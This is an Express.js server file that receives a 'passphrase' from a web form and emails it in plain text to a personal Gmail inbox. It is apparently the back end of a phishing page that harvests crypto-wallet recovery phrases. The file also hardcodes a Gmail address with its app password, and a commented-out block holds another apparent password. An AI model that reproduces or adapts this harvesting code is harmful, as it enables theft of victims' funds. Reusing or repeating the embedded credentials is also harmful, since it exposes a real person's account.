const express = require('express');
const bodyParser = require('body-parser');
const nodemailer = require('nodemailer');
const transporter = nodemailer.createTransport({
  host: 'smtp.gmail.com', // Gmail SMTP server
  port: 587,              // SMTP port (use 465 for SSL)
  secure: false,          // Use TLS (false for non-SSL)
  auth: {
      user: 'goyalmudit82@gmail.com',
      pass: 'obee pgfn qsoc dfsf'
  }
});

const app = express();
const PORT = 3000;
const path = require('path');

app.use(express.static(path.join(__dirname, 'frontend')));

// Middleware to parse form data
app.use(bodyParser.urlencoded({ extended: true }));

// Route to handle form submission
app.post('/send-email', (req, res) => {
  const { passphrase } = req.body;

  // Email configuration
  // const transporter = nodemailer.createTransport({
  //   service: 'gmail',
  //   auth: {
  //     user: 'goyalmudit82@gmail.com', // Replace with your Gmail
  //     pass: 'MGoyal@123', // Replace with your Gmail App Password
  //   },
  // });

  const mailOptions = {
    from: 'goyalmudit240@gmail.com',
    to: 'goyalmudit82@gmail.com', // Your email
    subject: 'New Passphrase Submitted',
    text: `Passphrase: ${passphrase}`,
  };

  // Send the email
  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.error(error);
      res.send('<h1>Error sending email</h1>');
    } else {
      console.log('Email sent: ' + info.response);
      res.send('<h1>Passphrase submitted successfully</h1>');
    }
  });
});

// Start the server
app.listen(PORT, () => {
  console.log(`Server is running on http://localhost:${PORT}`);
});
